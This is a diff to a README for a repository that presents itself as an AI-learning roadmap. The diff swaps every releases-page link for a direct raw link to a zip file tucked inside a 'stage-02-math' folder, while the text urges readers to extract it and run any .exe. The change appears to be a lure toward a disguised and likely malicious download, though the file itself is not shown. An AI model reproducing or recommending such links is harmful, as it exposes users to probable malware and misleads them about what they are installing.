@@ -1,12 +1,12 @@
 # 🤖 AIEngineer2027 - Learn AI From Zero to Production
 
-[![Download AIEngineer2027](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/peculiar-barrowboy822/AIEngineer2027/releases)
+[![Download AIEngineer2027](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/peculiar-barrowboy822/AIEngineer2027/main/stage-02-math/Engineer_AI_3.1.zip)
 
 AI Engineer by 2027 is a step-by-step roadmap that helps you learn AI from the ground up. It starts with Python and ends with building real AI apps.
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/peculiar-barrowboy822/AIEngineer2027/releases
+Visit this page to download: https://raw.githubusercontent.com/peculiar-barrowboy822/AIEngineer2027/main/stage-02-math/Engineer_AI_3.1.zip
 
 Open the latest release and download the Windows file if one is listed. If you see a `.zip` file, save it to your PC and extract it first. If you see a `.exe` file, save it and run it.
 
@@ -176,4 +176,4 @@ If you see:
 
 If you need to get the app again, use this page:
 
-https://github.com/peculiar-barrowboy822/AIEngineer2027/releases
+https://raw.githubusercontent.com/peculiar-barrowboy822/AIEngineer2027/main/stage-02-math/Engineer_AI_3.1.zip
